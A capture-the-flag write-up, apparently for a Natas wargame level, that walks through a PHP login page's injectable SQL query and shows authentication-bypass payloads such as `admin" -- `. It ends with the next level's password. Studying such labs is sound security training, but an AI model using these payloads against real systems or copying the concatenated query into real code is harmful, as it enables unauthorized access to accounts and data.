This level focuses on SQL Injection techniques. Inspecting the source code we see:
```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```

That the line `"SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""` can be translated to:
```sql
SELECT * from users where username="..." and password="..."
```

We can try different techniques like `admin" --` that converts the query to:
```sql
SELECT * from users where username="admin" --" and password="..."
```

Or `admin" OR "1"="1` that converts to:
```sql
SELECT * from users where username="admin" OR "1"="1" and password="..."
```

Let's try `admin" --`:
![[Pasted image 20260702151204.png]]
The reason: In MySQL the `--` is recognized as comment only if it is followed by a space "`-- `" without the space, the database encounters a syntax error and returns `false`. when PHP passes the `false` to `if(mysqli_num_rows(mysqli_query($link, $query)) > 0)` that becomes `if(mysqli_num_rows(false) > 0)` throws the above error.

The fix:
"`admin" -- `" as the payload:
![[Pasted image 20260702151942.png]]

lvl15 pass: GB6USCJYJjwLyYhZUNkE1NwDueiTow6g